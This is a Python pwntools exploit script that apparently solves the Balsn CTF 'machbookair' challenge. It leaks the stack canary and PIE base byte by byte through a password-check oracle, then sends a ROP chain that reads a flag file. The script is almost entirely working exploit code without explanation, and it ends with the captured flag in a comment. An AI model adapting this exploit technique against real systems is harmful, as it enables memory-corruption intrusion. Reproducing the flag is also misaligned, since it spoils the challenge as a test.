from pwn import *

#r = remote("machbookair.balsnctf.com", 19091)
r = process("./run.sh")
r.sendlineafter("admin: ", b"\xc3\x9f")

r.sendlineafter("> ",b"2")
r.sendlineafter("title: ",b"ss")

r.recvuntil("content: ")
password = r.recv(numb=47) 

def write_to_file(name,data):
    r.sendlineafter("> ",b"1")
    r.sendlineafter("title: ",name)
    r.sendafter("content: ",data)

#0x0FD046E95C8F009C
# bp 0x000000010ae83000+0x3800


write_to_file("ss",b"\x00"*0x30)
#r.interactive()

# fix uninit stuff on stack

def find_char(padding,suffix):
    write_to_file("ss",(b"A"*0x20)+ padding) # init with known plaintext
    crafted_password = (b"A"* 0x20) + padding
    guessed = 0
    found = False
    for guess_char in range(1,0x100):
        r.sendlineafter("> ",b"3")
        r.sendafter("password: ",crafted_password + p8(guess_char) + suffix + b"\x00")
        tmp = r.recvline().rstrip().decode('utf-8')
        if tmp != "unauthorized":
            log.info("good char @ %x",guess_char)
            guessed = guess_char
            found = True
            r.sendlineafter("> ", b"1")
            r.sendlineafter("title: ",b"ss")
            r.sendlineafter("> ", b"2")
            break

    if not found:
        log.info("couldn't find char for idx %d",guessed)
        guessed = 0x0
        pause()
    return p8(guessed)

canary = b""

canary += find_char(b"A"*7,b"")
canary =  find_char(b"A"*6,canary) + canary
canary =  find_char(b"A"*5,canary) + canary
canary =  find_char(b"A"*4,canary) + canary
canary =  find_char(b"A"*3,canary) + canary
canary =  find_char(b"A"*2,canary) + canary
canary = b"\x00" + canary
canary =  find_char(b"",b"") + canary

log.info("canary -> " +hex(u64(canary)))


def find_char(padding,suffix):
    write_to_file(b"ss",(b"A"*0x18)+ padding) # init with known plaintext
    crafted_password = (b"A"* 0x18) + padding
    guessed = 0
    found = False
    for guess_char in range(1,0x100):
        r.sendlineafter("> ",b"3")
        r.sendafter("password: ",crafted_password + p8(guess_char) + suffix + b"\x00")
        tmp = r.recvline().rstrip().decode('utf-8')
        if tmp != "unauthorized":
            log.info("good char @ %x",guess_char)
            guessed = guess_char
            found = True
            r.sendlineafter("> ", b"1")
            r.sendlineafter("title: ",b"ss")
            r.sendlineafter("> ", b"2")
            break

    if not found:
        log.info("couldn't find char for idx %d",guessed)
        guessed = 0x0
        #pause()
    return p8(guessed)

pie = b""
pie += find_char(b"A"*7,b"" + canary)
pie =  find_char(b"A"*6,pie +canary) + pie
pie =  find_char(b"A"*5,pie + canary) + pie
pie =  find_char(b"A"*4,pie + canary) + pie
pie =  find_char(b"A"*3,pie + canary) + pie
pie =  find_char(b"A"*2,pie+ canary) + pie
pie =  find_char(b"A"*1,pie + canary) + pie
pie =  find_char(b"",pie + canary) + pie

log.info("pie -> " +hex(u64(pie)))
base = u64(pie) - 0x3bef
log.info("base -> "+hex(base))

libc_base = 0x7fff6ef7f000
pop_rdi = libc_base + 0x3ce7
pop_rsi = libc_base + 0x2952    # pop rsi; pop rbp

payload = b"A" + (b"\x00" * 55)
payload += canary
payload += p64(libc_base + 0x9310) # rbp

payload += p64(pop_rdi)
payload += p64(base + 0x80D0)
payload += p64(pop_rsi)
payload += p64(0x100)
payload += p64(base + 0x80F0) # rbp
payload += p64(base + 0x3250)    # readn

payload += p64(pop_rdi)
payload += p64(base + 0x80D0)
payload += p64(base + 0x35c7)

write_to_file("ss",payload)

r.sendlineafter("> ","3")
r.sendafter("password: ","A\x00")
pause()
r.sendlineafter("> ","2")

r.sendline("/Users/sampriti/machbookair/flag")

r.interactive()

# content: BALSN{w4it_wh4t?!_it_iS_n0t_s4f3_0n_m4c0s?!}
